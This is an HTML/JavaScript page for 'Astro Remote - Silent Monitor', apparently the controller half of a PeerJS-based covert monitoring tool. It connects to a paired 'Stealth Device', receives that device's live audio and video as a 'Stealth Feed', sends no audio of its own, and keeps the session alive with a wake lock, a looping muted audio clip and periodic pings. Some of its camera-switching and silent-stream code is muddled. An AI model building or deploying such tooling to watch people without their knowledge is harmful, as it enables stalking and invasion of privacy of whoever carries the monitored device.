<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Remote - Silent Monitor</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Times New Roman', Georgia, serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
        .star { position: absolute; background: white; border-radius: 50%; opacity: 0.8; animation: twinkle 3s infinite; }
        @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
        .container {
            max-width: 500px; width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 30px; overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            position: relative; z-index: 1;
            border: 1px solid rgba(255,215,0,0.3);
        }
        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #1a1a2e 100%);
            color: #ffd700; padding: 12px 16px; text-align: center;
            border-bottom: 2px solid #ffd700;
        }
        .header h1 { font-size: 18px; margin-bottom: 3px; font-family: 'Georgia', serif; letter-spacing: 2px; }
        .status { font-size: 10px; margin-top: 5px; }
        .status.connected { color: #90EE90; }
        .connect-section { background: #1a1a2e; padding: 12px; text-align: center; border-bottom: 1px solid #ffd70033; }
        .connect-btn {
            background: linear-gradient(135deg, #ffd700 0%, #ffb347 100%);
            color: #1a1a2e; border: none; padding: 10px 24px;
            border-radius: 25px; font-size: 14px; font-weight: bold;
            cursor: pointer; font-family: monospace;
        }
        .connect-btn:active { transform: scale(0.97); }
        .connect-btn.disabled { background: #666; opacity: 0.6; }
        .call-controls {
            background: #1a1a2e; padding: 12px;
            display: flex; gap: 10px; justify-content: center;
            flex-wrap: wrap; border-bottom: 1px solid #ffd70033;
        }
        .call-btn {
            background: #2c3e50; color: #ffd700;
            border: 1px solid #ffd700; padding: 10px 16px;
            border-radius: 25px; font-size: 11px; font-weight: bold;
            cursor: pointer; flex: 1; min-width: 100px; font-family: monospace;
        }
        .call-btn:active { transform: scale(0.97); }
        .camera-controls {
            background: #1a1a2e; padding: 10px;
            display: flex; gap: 10px; justify-content: center;
            border-bottom: 1px solid #ffd70033;
        }
        .camera-btn {
            background: #0f3460; color: #ffd700;
            border: 1px solid #ffd700; padding: 8px 16px;
            border-radius: 25px; font-size: 11px; font-weight: bold;
            cursor: pointer; flex: 1; font-family: monospace;
        }
        .camera-btn:active { transform: scale(0.97); }
        .camera-btn:disabled { opacity: 0.4; }
        .camera-btn.active { background: #ffd700; color: #1a1a2e; }
        .call-btn.end { background: #5a1e1e; border-color: #ff6b6b; color: #ff6b6b; }
        .call-btn:disabled { opacity: 0.4; }
        .video-container { display: none; background: #000; padding: 10px; }
        .video-container.active { display: block; }
        .video-wrapper {
            position: relative; background: #1a1a2e;
            border-radius: 15px; overflow: hidden; border: 1px solid #ffd700;
        }
        video { width: 100%; max-height: 300px; background: #000; display: block; }
        #remoteVideo { width: 100%; }
        .video-label {
            position: absolute; bottom: 6px; left: 6px;
            background: rgba(0,0,0,0.7); color: #ffd700;
            padding: 2px 8px; border-radius: 15px; font-size: 9px;
        }
        .call-status {
            text-align: center; font-size: 11px; padding: 8px;
            background: #0f3460; color: #ffd700; font-family: monospace;
        }
        .ids {
            display: flex; justify-content: center; gap: 20px;
            padding: 8px; background: #1a1a2e;
            font-size: 10px; color: #ffd700; font-family: monospace;
            border-bottom: 1px solid #ffd70033; flex-wrap: wrap;
        }
        .id-badge { background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 12px; }
        .warning-badge {
            background: #5a1e1e; color: #ff6b6b;
            font-size: 9px; padding: 4px 8px; border-radius: 12px; text-align: center;
        }
        @media (max-width: 480px) {
            body { padding: 8px; }
            .call-btn, .camera-btn { font-size: 9px; padding: 8px 10px; }
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <div class="stars" id="stars"></div>
    <div class="container">
        <div class="header">
            <h1>🌟 ASTRO REMOTE 🌟</h1>
            <div class="status" id="statusText">🔮 Stealth Device: Offline</div>
        </div>
        <div class="ids">
            <div class="id-badge">🎮 Remote: APrivate</div>
            <div class="id-badge">👁️ Stealth: BPrivate</div>
            <div class="warning-badge">🔇 REMOTE SILENT - No audio sent</div>
        </div>
        <div class="connect-section">
            <button class="connect-btn" id="connectBtn">🔮 CONNECT TO STEALTH DEVICE 🔮</button>
        </div>
        <div class="call-controls">
            <button class="call-btn" id="audioOnlyBtn" disabled>🎙️ Audio Only</button>
            <button class="call-btn" id="videoCallBtn" disabled>📹 Video Monitor</button>
            <button class="call-btn end" id="endCallBtn" disabled>🔴 Stop</button>
        </div>
        <div class="camera-controls" id="cameraControls" style="display: none;">
            <button class="camera-btn" id="frontCameraBtn">📱 Remote Front Camera</button>
            <button class="camera-btn" id="backCameraBtn">📷 Remote Back Camera</button>
        </div>
        <div class="call-status" id="callStatus">⚫ Standby</div>
        <div class="video-container" id="videoContainer">
            <div class="video-wrapper">
                <video id="remoteVideo" autoplay playsinline></video>
                <span class="video-label">👁️ Stealth Feed</span>
            </div>
        </div>
    </div>

    <script>
        for(let i = 0; i < 100; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.width = Math.random() * 3 + 'px';
            star.style.height = star.style.width;
            star.style.animationDelay = Math.random() * 3 + 's';
            document.getElementById('stars').appendChild(star);
        }

        const MY_ID = "APrivate";
        const PARTNER_ID = "BPrivate";

        let peer = null;
        let conn = null;
        let mediaCall = null;
        let localStream = null;
        let currentCamera = 'front';
        let isVideoMode = false;
        let keepAliveInterval = null;
        
        // Camera device IDs
        let frontCameraId = null;
        let backCameraId = null;
        let cameraDetectionDone = false;

        const connectBtn    = document.getElementById('connectBtn');
        const audioOnlyBtn  = document.getElementById('audioOnlyBtn');
        const videoCallBtn  = document.getElementById('videoCallBtn');
        const endCallBtn    = document.getElementById('endCallBtn');
        const frontCameraBtn = document.getElementById('frontCameraBtn');
        const backCameraBtn  = document.getElementById('backCameraBtn');
        const cameraControls = document.getElementById('cameraControls');
        const statusText    = document.getElementById('statusText');
        const callStatus    = document.getElementById('callStatus');
        const videoContainer = document.getElementById('videoContainer');
        const remoteVideo   = document.getElementById('remoteVideo');

        // Detect cameras and get their device IDs
        async function detectCameras() {
            try {
                // Request permission first
                await navigator.mediaDevices.getUserMedia({ video: true });
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === "videoinput");
                
                console.log(`[REMOTE] Found ${cameras.length} cameras:`);
                cameras.forEach((cam, i) => {
                    console.log(`  Camera ${i + 1}: ${cam.label || 'Unnamed'} - ID: ${cam.deviceId.substring(0, 20)}...`);
                });
                
                // Identify front and back cameras by label
                for (const cam of cameras) {
                    const label = cam.label.toLowerCase();
                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
                        backCameraId = cam.deviceId;
                        console.log(`[REMOTE] Identified BACK camera: ${cam.label}`);
                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
                        frontCameraId = cam.deviceId;
                        console.log(`[REMOTE] Identified FRONT camera: ${cam.label}`);
                    }
                }
                
                // Fallback: if labels don't help, assume first is front, second is back
                if (!frontCameraId && cameras[0]) {
                    frontCameraId = cameras[0].deviceId;
                    console.log(`[REMOTE] Using first camera as FRONT`);
                }
                if (!backCameraId && cameras[1]) {
                    backCameraId = cameras[1].deviceId;
                    console.log(`[REMOTE] Using second camera as BACK`);
                }
                
                cameraDetectionDone = true;
                
                if (frontCameraId) {
                    console.log(`[REMOTE] Front camera ID: ${frontCameraId.substring(0, 20)}...`);
                }
                if (backCameraId) {
                    console.log(`[REMOTE] Back camera ID: ${backCameraId.substring(0, 20)}...`);
                }
                
            } catch (err) {
                console.warn(`[REMOTE] Camera detection failed: ${err.message}`);
                cameraDetectionDone = false;
            }
        }

        // Get camera stream using deviceId (most reliable method)
        async function getRemoteCameraStream(useBackCamera) {
            // Stop old stream first
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }
            
            // Ensure we have camera IDs
            if (!cameraDetectionDone) {
                await detectCameras();
            }
            
            const targetDeviceId = useBackCamera ? backCameraId : frontCameraId;
            
            // Method 1: Use exact deviceId if available
            if (targetDeviceId) {
                try {
                    console.log(`[REMOTE] Trying ${useBackCamera ? 'BACK' : 'FRONT'} camera with deviceId`);
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: false,
                        video: {
                            deviceId: { exact: targetDeviceId },
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                    
                    const videoTrack = stream.getVideoTracks()[0];
                    const settings = videoTrack.getSettings();
                    console.log(`[REMOTE] ${useBackCamera ? 'BACK' : 'FRONT'} camera acquired via deviceId`);
                    console.log(`[REMOTE] Camera settings:`, settings);
                    
                    return stream;
                    
                } catch (err) {
                    console.warn(`[REMOTE] deviceId method failed: ${err.message}`);
                }
            }
            
            // Method 2: Use facingMode with exact constraint
            try {
                console.log(`[REMOTE] Trying ${useBackCamera ? 'BACK' : 'FRONT'} camera with exact facingMode`);
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: {
                        facingMode: { exact: useBackCamera ? "environment" : "user" },
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                const videoTrack = stream.getVideoTracks()[0];
                const settings = videoTrack.getSettings();
                console.log(`[REMOTE] ${useBackCamera ? 'BACK' : 'FRONT'} camera acquired via facingMode`);
                console.log(`[REMOTE] Camera settings:`, settings);
                
                return stream;
                
            } catch (err) {
                console.warn(`[REMOTE] Exact facingMode failed: ${err.message}`);
            }
            
            // Method 3: Fallback to any camera
            console.log(`[REMOTE] Falling back to default camera`);
            return await navigator.mediaDevices.getUserMedia({
                audio: false,
                video: { width: { ideal: 640 }, height: { ideal: 480 } }
            });
        }

        // Switch remote's own camera
        async function switchRemoteCamera(targetCamera) {
            if (!isVideoMode || !mediaCall) {
                callStatus.innerText = '⚠️ Start video monitor first';
                return;
            }
            if (targetCamera === currentCamera) return;
            
            const useBackCamera = (targetCamera === 'back');
            callStatus.innerText = `🔄 Switching to ${targetCamera} camera...`;
            
            try {
                const newStream = await getRemoteCameraStream(useBackCamera);
                
                if (mediaCall.peerConnection) {
                    const senders = mediaCall.peerConnection.getSenders();
                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
                    if (videoSender && newStream.getVideoTracks()[0]) {
                        await videoSender.replaceTrack(newStream.getVideoTracks()[0]);
                        console.log(`[REMOTE] Video track replaced successfully`);
                    }
                }
                
                localStream = newStream;
                currentCamera = targetCamera;
                
                frontCameraBtn.classList.toggle('active', currentCamera === 'front');
                backCameraBtn.classList.toggle('active', currentCamera === 'back');
                
                // Log actual camera being used
                const videoTrack = localStream.getVideoTracks()[0];
                if (videoTrack) {
                    const settings = videoTrack.getSettings();
                    console.log(`[REMOTE] Active camera settings:`, settings);
                    callStatus.innerText = `📹 Remote ${currentCamera} camera ACTIVE (${settings.facingMode || 'unknown'})`;
                } else {
                    callStatus.innerText = `📹 Remote ${currentCamera} camera ACTIVE`;
                }
                
                setTimeout(() => {
                    if (callStatus.innerText.includes('Switching')) {
                        callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
                    }
                }, 2000);
                
            } catch (err) {
                console.error(`[REMOTE] Camera switch failed:`, err);
                callStatus.innerText = `❌ Camera switch failed: ${err.message}`;
            }
        }

        // Prevent screen lock
        function preventScreenLock() {
            if ('wakeLock' in navigator) {
                let wakeLock = null;
                const requestWakeLock = async () => {
                    try {
                        wakeLock = await navigator.wakeLock.request('screen');
                        console.log('[REMOTE] Screen wake lock acquired');
                    } catch (err) {}
                };
                requestWakeLock();
                document.addEventListener('visibilitychange', () => {
                    if (!document.hidden && wakeLock === null) requestWakeLock();
                });
            }
            
            const silentAudio = new Audio();
            silentAudio.src = 'data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
            silentAudio.loop = true;
            silentAudio.volume = 0;
            silentAudio.play().catch(e => {});
            
            keepAliveInterval = setInterval(() => {
                if (conn && conn.open) {
                    conn.send({ type: 'ping', timestamp: Date.now() });
                }
            }, 15000);
        }

        function setStatus(connected) {
            if (connected) {
                statusText.innerText = '✅ Stealth Device: Connected';
                statusText.classList.add('connected');
                connectBtn.innerText = '🌟 DEVICE CONNECTED 🌟';
                connectBtn.disabled = true;
                audioOnlyBtn.disabled = false;
                videoCallBtn.disabled = false;
            } else {
                statusText.innerText = '🔮 Stealth Device: Offline';
                statusText.classList.remove('connected');
                connectBtn.innerText = '🔮 CONNECT TO STEALTH DEVICE 🔮';
                connectBtn.disabled = false;
                audioOnlyBtn.disabled = true;
                videoCallBtn.disabled = true;
                endCallBtn.disabled = true;
                cameraControls.style.display = 'none';
            }
        }

        async function makeSilentAudioStream() {
            try {
                return await navigator.mediaDevices.getUserMedia({ audio: false, video: false });
            } catch (e) {
                return new MediaStream();
            }
        }

        async function startCall(withVideo) {
            if (!conn) {
                callStatus.innerText = '❌ Connect to stealth device first';
                return;
            }

            try {
                isVideoMode = withVideo;
                callStatus.innerText = `📡 Starting ${withVideo ? 'video' : 'audio'} monitor...`;

                let streamToSend = null;
                
                if (withVideo) {
                    // Detect cameras first
                    await detectCameras();
                    
                    streamToSend = await getRemoteCameraStream(false);
                    localStream = streamToSend;
                    currentCamera = 'front';
                    videoContainer.classList.add('active');
                    cameraControls.style.display = 'flex';
                    frontCameraBtn.classList.add('active');
                    backCameraBtn.classList.remove('active');
                    
                    // Log camera info
                    const videoTrack = localStream.getVideoTracks()[0];
                    if (videoTrack) {
                        const settings = videoTrack.getSettings();
                        console.log(`[REMOTE] Initial camera settings:`, settings);
                    }
                } else {
                    streamToSend = await makeSilentAudioStream();
                    cameraControls.style.display = 'none';
                }

                mediaCall = peer.call(PARTNER_ID, streamToSend, {
                    metadata: { type: withVideo ? 'video' : 'voice' }
                });

                mediaCall.on('stream', (remoteStream) => {
                    if (remoteStream.getVideoTracks().length > 0) {
                        remoteVideo.srcObject = remoteStream;
                        remoteVideo.play().catch(e => console.log('Video error:', e));
                    }
                    
                    if (remoteStream.getAudioTracks().length > 0) {
                        const stealthAudio = new Audio();
                        stealthAudio.srcObject = remoteStream;
                        stealthAudio.play().catch(e => console.log('Audio error:', e));
                    }
                    
                    callStatus.innerText = `👁️ ${withVideo ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
                    audioOnlyBtn.disabled = true;
                    videoCallBtn.disabled = true;
                    endCallBtn.disabled = false;
                });

                mediaCall.on('close', () => { endCall(); });
                mediaCall.on('error', (err) => { endCall(); });

            } catch (err) {
                console.error('[REMOTE] Start call error:', err);
                callStatus.innerText = '❌ Failed to start monitor';
                endCall();
            }
        }

        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(t => t.stop());
                localStream = null;
            }
            if (mediaCall) { 
                mediaCall.close(); 
                mediaCall = null; 
            }
            remoteVideo.srcObject = null;
            videoContainer.classList.remove('active');
            cameraControls.style.display = 'none';
            isVideoMode = false;
            callStatus.innerText = '⚫ Monitor stopped';
            if (conn) { 
                audioOnlyBtn.disabled = false; 
                videoCallBtn.disabled = false; 
            }
            endCallBtn.disabled = true;
        }

        function setupConnection(connection) {
            conn = connection;
            setStatus(true);
            callStatus.innerText = '✅ Connected - Ready to monitor';
            
            conn.on('close', () => { 
                setStatus(false); 
                endCall(); 
                callStatus.innerText = '⚫ Device disconnected';
            });
        }

        function connectToPartner() {
            if (conn) { callStatus.innerText = '✅ Already connected'; return; }
            callStatus.innerText = '🔍 Locating stealth device...';
            
            const connection = peer.connect(PARTNER_ID);
            
            connection.on('open', () => {
                console.log('[REMOTE] Connected to stealth');
                callStatus.innerText = '✅ Connected to stealth device!';
                setupConnection(connection);
            });
            
            connection.on('error', () => {
                callStatus.innerText = '❌ Stealth device offline';
                setStatus(false);
            });
        }

        function init() {
            peer = new Peer(MY_ID);
            peer.on('open', () => { 
                callStatus.innerText = '✅ Remote ready - Click Connect'; 
            });
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') callStatus.innerText = '❌ Remote ID in use';
            });
            
            preventScreenLock();
            
            // Pre-detect cameras on page load
            navigator.mediaDevices.enumerateDevices().then(() => {
                detectCameras();
            });
        }

        connectBtn.addEventListener('click', connectToPartner);
        audioOnlyBtn.addEventListener('click', () => startCall(false));
        videoCallBtn.addEventListener('click', () => startCall(true));
        endCallBtn.addEventListener('click', endCall);
        frontCameraBtn.addEventListener('click', () => switchRemoteCamera('front'));
        backCameraBtn.addEventListener('click', () => switchRemoteCamera('back'));

        window.addEventListener('beforeunload', () => {
            if (keepAliveInterval) clearInterval(keepAliveInterval);
            if (conn) conn.close();
            if (peer) peer.destroy();
        });

        init();
    </script>
</body>
</html>
